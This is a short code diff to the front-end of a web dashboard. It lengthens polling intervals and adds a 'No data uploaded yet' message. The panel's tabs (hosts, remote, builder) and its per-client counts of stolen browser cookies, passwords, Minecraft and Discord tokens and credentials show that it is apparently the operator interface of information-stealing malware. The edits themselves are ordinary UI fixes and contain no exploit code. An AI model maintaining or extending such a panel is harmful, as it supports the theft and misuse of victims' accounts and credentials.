@@ -9,7 +9,7 @@ const state = {
   remote: { offset: 0, q: '' },
 };
 let pollTimer = null;
-let pollIntervalMs = 3000;
+let pollIntervalMs = 120000; // Changed to 2 minutes to stop flashing
 
 async function loadMe() {
   const r = await fetch('/api/me');
@@ -81,9 +81,9 @@ document.querySelectorAll('.nav a').forEach((a) => {
     a.classList.add('active');
     $(a.dataset.tab).classList.add('active');
     const tab = a.dataset.tab;
-    if (tab === 'overview') { pollIntervalMs = 3000; loadOverview(); startPolling(); }
-    else if (tab === 'hosts') { pollIntervalMs = 5000; loadHosts(); startPolling(); }
-    else if (tab === 'remote') { pollIntervalMs = 8000; loadRemote(); startPolling(); }
+    if (tab === 'overview') { pollIntervalMs = 120000; loadOverview(); startPolling(); }
+    else if (tab === 'hosts') { pollIntervalMs = 120000; loadHosts(); startPolling(); }
+    else if (tab === 'remote') { pollIntervalMs = 120000; loadRemote(); startPolling(); }
     else if (tab === 'builder') { stopPolling(); window.__builderResumeMc?.(); }
     else stopPolling();
   });
@@ -230,6 +230,15 @@ async function loadInlineUploads(clientId, container) {
   const latest = rows[0];
   const s = latest.stats || { netscapeCookies: 0, jsonCookies: 0, passwords: 0, mcTokens: 0, discordTokens: 0, creds: [] };
   const totalCookies = s.netscapeCookies + s.jsonCookies;
+
+  if (totalCookies === 0 && s.passwords === 0) {
+      container.innerHTML = `
+        <div class="note" style="padding: 20px; color: var(--muted); text-align: center;">
+            No data uploaded yet.
+        </div>
+      `;
+      return;
+  }
 
   let html = `
     <div class="tiles" style="margin-bottom: 20px; grid-template-columns: repeat(4, 1fr);">
